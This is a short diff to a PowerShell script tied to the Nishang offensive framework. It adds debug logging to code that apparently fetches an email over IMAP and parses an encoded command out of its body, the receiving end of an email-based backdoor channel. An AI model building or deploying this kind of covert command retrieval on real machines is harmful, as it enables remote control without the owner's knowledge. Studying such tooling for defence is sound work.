@@ -103,7 +103,9 @@ https://github.com/samratashok/nishang
                         [int]$mail = $tmp[-1]
                         
                         #FETCH the body of the last email which matches the SEARCH criteria
+                        Write-Verbose "Mail data: $mail"
                         $cmd = ReadResponse("$ FETCH $mail BODY[TEXT]`r`n", "1")
+                        Write-Verbose "cmd: $cmd"
                         $tmp = $cmd[2] -split "\)",2 -replace "`n" 
                         $TempCommand = ($tmp[0] -split "##",2)[1] -replace "(?<=\=)3D" -replace "`r"
                         $EncCommand = $TempCommand -replace '(?!={1,2}$)=','' -replace "`r"
